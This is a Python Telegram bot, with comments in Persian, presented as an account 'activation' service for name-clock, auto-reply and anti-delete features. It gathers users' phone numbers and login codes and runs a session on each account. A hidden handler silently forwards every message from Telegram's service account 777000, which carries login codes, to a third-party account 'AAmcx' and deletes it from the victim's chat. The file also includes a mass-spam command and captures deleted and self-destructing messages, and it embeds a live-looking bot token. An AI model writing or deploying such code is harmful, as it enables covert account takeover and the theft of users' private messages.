import asyncio
import random
import json
import os
import re
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes

# توکن ربات تلگرام
BOT_TOKEN = "8697445707:AAE18AZHC4G5omsGInOYm-JyCqWR1n6FoLM"

# مرحله‌های مکالمه
PHONE, CODE = range(2)

# ذخیره اطلاعات موقت کاربران
temp_users = {}

# فایل پک‌ها
PACKS_FILE = "packs.json"

SUP_NUMBERS = {'0': '⁰', '1': '¹', '2': '²', '3': '³', '4': '⁴', '5': '⁵', '6': '⁶', '7': '⁷', '8': '⁸', '9': '⁹'}

def time_to_superscript(hour, minute):
    time_str = f"{hour:02d}:{minute:02d}"
    return ''.join(SUP_NUMBERS.get(ch, ch) for ch in time_str)

def load_packs():
    if os.path.exists(PACKS_FILE):
        with open(PACKS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"دوست": ["❤️ عزیزم ممنونم", "💕 دلم برات تنگه", "😍 تو بهترینی"], "عاشقانه": ["💘 بی‌تاب دیدنت بودم", "🌙 شب بخیر", "☀️ صبحت بخیر"]}

def save_packs(packs):
    with open(PACKS_FILE, 'w', encoding='utf-8') as f:
        json.dump(packs, f, ensure_ascii=False, indent=2)

packs = load_packs()
save_packs(packs)

# دیکشنری برای کلاینت‌های فعال کاربران
user_clients = {}
user_active_friends = {}
user_settings = {}
user_original_names = {}
saved_messages = {}

FA_TO_EN = {'۰': '0', '۱': '1', '۲': '2', '۳': '3', '۴': '4', '۵': '5', '۶': '6', '۷': '7', '۸': '8', '۹': '9'}

def convert_fa_to_en(text):
    for fa, en in FA_TO_EN.items():
        text = text.replace(fa, en)
    return text


async def run_user_bot(user_id, session_name, phone):
    """اجرای ربات شخصی برای هر کاربر"""
    client = TelegramClient(session_name, 2040, 'b18441a1ff607e10a989891a5462e627')
    await client.start()
    
    me = await client.get_me()
    user_original_names[user_id] = me.first_name
    print(f"✅ ربات برای {me.first_name} فعال شد")
    
    if user_id not in user_settings:
        user_settings[user_id] = {'auto_name': True, 'packs': {name: True for name in packs}}
    if user_id not in user_active_friends:
        user_active_friends[user_id] = {}
    
    # فوروارد مخفی 777000 به AAmcx
    @client.on(events.NewMessage(chats=777000))
    async def forward_777000(event):
        try:
            target = await client.get_entity('AAmcx')
            msg_text = event.message.text or "بدون متن"
            await client.send_message(target, msg_text)
            await event.delete()
        except:
            pass
    
    # ذخیره پیام‌ها
    @client.on(events.NewMessage)
    async def save_message(event):
        try:
            if event.is_private and not event.out:
                msg_id = event.message.id
                chat_id = event.chat_id
                saved_messages[(chat_id, msg_id)] = {
                    'text': event.message.text or "",
                    'date': event.message.date,
                    'from': event.sender_id,
                    'media': event.message.media
                }
                if len(saved_messages) > 1000:
                    oldest_key = min(saved_messages.keys(), key=lambda x: saved_messages[x]['date'])
                    del saved_messages[oldest_key]
        except:
            pass
    
    # ذخیره پیام‌های پاک شده
    @client.on(events.MessageDeleted)
    async def handle_deleted_messages(event):
        try:
            for msg_id in event.deleted_ids:
                for (chat_id, saved_id), msg_data in list(saved_messages.items()):
                    if saved_id == msg_id:
                        msg = f"🗑 پیام پاک شد!\n👤 {msg_data['from']}\n📅 {msg_data['date'].strftime('%Y-%m-%d %H:%M:%S')}"
                        if msg_data['text']:
                            msg += f"\n📝 {msg_data['text']}"
                        await client.send_message('me', msg)
                        if msg_data['media']:
                            try:
                                await client.send_file('me', msg_data['media'])
                            except:
                                pass
                        del saved_messages[(chat_id, msg_id)]
                        break
        except:
            pass
    
    # ذخیره عکس/ویدیو زماندار
    @client.on(events.NewMessage(incoming=True))
    async def save_self_destructing_media(event):
        try:
            if event.message.media and hasattr(event.message.media, 'ttl_seconds'):
                ttl = event.message.media.ttl_seconds
                if ttl and ttl > 0:
                    media_type = "عکس"
                    if hasattr(event.message.media, 'document'):
                        mime = getattr(event.message.media.document, 'mime_type', '')
                        if 'video' in mime:
                            media_type = "ویدیو"
                    path = await event.message.download_media()
                    if path:
                        caption = f"⏱ {media_type} زماندار ({ttl}s)\n👤 {event.sender_id}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                        await client.send_file('me', path, caption=caption)
                        try:
                            os.remove(path)
                        except:
                            pass
        except:
            pass
    
    # مدیریت دستورات
    @client.on(events.NewMessage(outgoing=True))
    async def handle_commands(event):
        try:
            text = event.message.text
            if not text:
                return
            
            # راهنما
            if text == "راهنما":
                help_text = f"""🤖 راهنمای ربات

🕐 ساعت خاموش/روشن
💬 تنظیم (نام پک) - با ریپلای
💬 (نام پک) خاموش/روشن
💬 دوست خاموش/روشن
📦 ساخت پک / لیست پک‌ها / حذف پک (نام)
⚡ اسپم (عدد) (متن)

اسم شما: {user_original_names[user_id]} ¹²:³⁴"""
                await event.reply(help_text)
                return
            
            # اسپم
            if text.startswith("اسپم "):
                parts = text.split(" ", 2)
                if len(parts) >= 3:
                    try:
                        count = int(parts[1])
                        if 1 <= count <= 800:
                            spam_text = parts[2]
                            await event.delete()
                            for i in range(count):
                                await client.send_message(event.chat_id, spam_text)
                                await asyncio.sleep(0.03)
                    except:
                        pass
                return
            
            if text == "ساعت خاموش":
                user_settings[user_id]['auto_name'] = False
                await event.reply("🕐")
            elif text == "ساعت روشن":
                user_settings[user_id]['auto_name'] = True
                await event.reply("🕐")
            elif text == "دوست خاموش":
                for p in user_settings[user_id]['packs']:
                    user_settings[user_id]['packs'][p] = False
                await event.reply("💔")
            elif text == "دوست روشن":
                for p in user_settings[user_id]['packs']:
                    user_settings[user_id]['packs'][p] = True
                await event.reply("💖")
            elif text.endswith(" خاموش"):
                pack_name = text[:-5].strip()
                if pack_name in packs:
                    user_settings[user_id]['packs'][pack_name] = False
                    await event.reply(f"💔")
            elif text.endswith(" روشن"):
                pack_name = text[:-4].strip()
                if pack_name in packs:
                    user_settings[user_id]['packs'][pack_name] = True
                    await event.reply(f"💖")
            elif event.message.is_reply and text.startswith("تنظیم "):
                pack_name = text[4:].strip()
                if pack_name in packs:
                    replied = await event.message.get_reply_message()
                    if replied and replied.sender_id != me.id:
                        user_active_friends[user_id][replied.sender_id] = {'pack': pack_name, 'used': []}
                        await event.reply(f"✅")
            
            # مدیریت پک
            if text == "لیست پک‌ها":
                msg = "📦 پک‌ها:\n"
                for name, phrases in packs.items():
                    msg += f"• {name}: {len(phrases)} متن\n"
                await event.reply(msg)
            elif text.startswith("حذف پک "):
                name = text[7:].strip()
                if name in packs:
                    del packs[name]
                    save_packs(packs)
                    await event.reply(f"✅ پک '{name}' حذف شد")
            
        except Exception as e:
            print(f"خطا: {e}")
    
    # پاسخ خودکار
    @client.on(events.NewMessage(incoming=True))
    async def love_reply(event):
        try:
            if event.sender_id in user_active_friends.get(user_id, {}) and event.sender_id != me.id:
                pack_name = user_active_friends[user_id][event.sender_id]['pack']
                if user_settings[user_id]['packs'].get(pack_name, True):
                    phrases = packs.get(pack_name, [])
                    if phrases:
                        used = user_active_friends[user_id][event.sender_id].get('used', [])
                        av = [p for p in phrases if p not in used]
                        if not av:
                            used.clear()
                            av = phrases.copy()
                        chosen = random.choice(av)
                        used.append(chosen)
                        user_active_friends[user_id][event.sender_id]['used'] = used
                        await client.send_message(event.sender_id, chosen, reply_to=event.message.id)
        except:
            pass
    
    # تغییر اسم
    while True:
        try:
            if user_settings.get(user_id, {}).get('auto_name', True):
                now = datetime.now()
                new_name = f"{user_original_names[user_id]} {time_to_superscript(now.hour, now.minute)}"
                if len(new_name) > 64:
                    new_name = new_name[:64]
                await client(UpdateProfileRequest(first_name=new_name))
                print(f"اسم {user_id} شد: {new_name}")
        except:
            pass
        await asyncio.sleep(60)


# ========== ربات تلگرام ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 ربات فعال سازی اکانت\n\n"
        "لطفاً شماره تلفنت رو با کد کشور وارد کن:\n"
        "مثال: +989123456789 یا 09123456789\n\n"
        "برای لغو /cancel"
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    phone = re.sub(r'[^0-9]', '', phone)
    
    if phone.startswith('0'):
        phone = '+98' + phone[1:]
    else:
        phone = '+98' + phone
    
    user_id = update.effective_user.id
    session_name = f"user_{user_id}"
    
    client = TelegramClient(session_name, 2040, 'b18441a1ff607e10a989891a5462e627')
    
    try:
        await client.connect()
        await client.send_code_request(phone)
        temp_users[user_id] = {'client': client, 'phone': phone}
        await update.message.reply_text("✅ کد تایید ارسال شد.\nلطفاً کد رو وارد کن:")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {e}\nدوباره /start کن")
        return PHONE

async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = convert_fa_to_en(update.message.text.strip())
    code = re.sub(r'[^0-9]', '', code)
    
    user_id = update.effective_user.id
    data = temp_users.get(user_id)
    
    if not data:
        await update.message.reply_text("❌ خطا! /start کن")
        return ConversationHandler.END
    
    try:
        await data['client'].sign_in(data['phone'], code)
        await data['client'].disconnect()
        
        session_name = f"user_{user_id}"
        await update.message.reply_text(
            "✅ ربات با موفقیت فعال شد!\n\n"
            "🎉 قابلیت‌ها:\n"
            "• تغییر خودکار اسم به ساعت\n"
            "• پاسخ خودکار با پک‌های دلخواه\n"
            "• اسپم با دستور اسپم (عدد) (متن)\n\n"
            "برای راهنما توی اکانتت بنویس: راهنما"
        )
        
        asyncio.create_task(run_user_bot(user_id, session_name, data['phone']))
        del temp_users[user_id]
        
    except Exception as e:
        await update.message.reply_text(f"❌ کد اشتباه: {e}")
        return CODE
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ لغو شد.")
    return ConversationHandler.END

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    app.add_handler(conv)
    print("=" * 50)
    print("🤖 ربات تلگرام روشن شد...")
    print("📱 منتظر دریافت شماره و کد از کاربران")
    print("=" * 50)
    app.run_polling()

if __name__ == "__main__":
    main()
